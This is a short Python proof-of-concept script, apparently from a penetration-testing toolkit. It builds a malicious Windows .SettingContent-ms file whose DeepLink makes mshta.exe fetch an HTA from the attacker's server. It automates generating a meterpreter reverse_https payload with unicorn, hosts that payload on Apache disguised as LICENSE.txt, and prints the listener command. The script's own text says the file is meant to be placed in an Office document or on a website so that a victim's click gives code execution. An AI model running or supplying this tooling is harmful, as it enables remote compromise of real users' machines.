#!/usr/bin/python
#
# This is just a quick automated way to delpoy settingcontent with unicorn
#
# Need to ensure Metasploit is installed, consider installing from:
# git clone https://github.com/trustedsec/ptf
# cd ptf
# ./ptf
# use module/exploitation/metasploit
# run
#
# Also ensure Apache is installed
#
import subprocess
try: raw_input
except: input = raw_input

def settingcontent(lhost):
    content=("""
<?xml version="1.0" encoding="UTF-8"?>
<PCSettings>
  <SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent">
    <ApplicationInformation>
      <AppID>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel</AppID>
      <DeepLink>%windir%\system32\mshta.exe REPLACEHERE</DeepLink>
      <Icon>%windir%\system32\control.exe</Icon>
    </ApplicationInformation>
    <SettingIdentity>
      <PageID></PageID>
      <HostID>{12B1697E-D3A0-4DBC-B568-CCF64A3F934D}</HostID>
    </SettingIdentity>
    <SettingInformation>
      <Description>@shell32.dll,-4161</Description>
      <Keywords>@shell32.dll,-4161</Keywords>
    </SettingInformation>
  </SearchableContent>
</PCSettings>
    """)

    return content.replace("REPLACEHERE", "http://{0}/LICENSE.txt".format(lhost))

print("""
This is a simple script that will generate a .SettingContent-ms file which can be used for command/code execution on the system. 
This file can be hosted inside of a office document, or on a website for the victim to click and gain code execution. This is 
just a POC and used with Metasploit. You can use whatever you want as far as payload, in this example we are just using 
windows/meterpreter/reverse_https.

Credit to: Matt Nelson (@enigma0x3) from SpecterOps
Great read here: https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39
Written by: David Kennedy (@HackingDave, @TrustedSec)

Version 0.1""")

lhost = raw_input("Enter the reverse shell IP address: " )
port = raw_input("Enter the port for the reverse shell: ")
subprocess.Popen("git clone https://github.com/trustedsec/unicorn;cd unicorn;python unicorn.py windows/meterpreter/reverse_https {0} {1} hta;cd hta_attack;cp Launcher.hta /var/www/html/LICENSE.txt;service apache2 start".format(lhost,port), shell=True).wait()
subprocess.Popen("cp unicorn/hta_attack/unicorn.rc ./;rm -rf unicorn/", shell=True).wait()
filewrite = file("Test.SettingContent-ms", "w")
filewrite.write(settingcontent(lhost))
filewrite.close()

print("[*] Exported Test.SettingContent-ms to this folder. Moved over LICENSE.txt (malicious HTA) and setup the SettingContent-ms to point to the Apache server hosting this under /var/www/html")
print("[*] To launch the Metasploit listener, run msfconsole -r unicorn.rc")
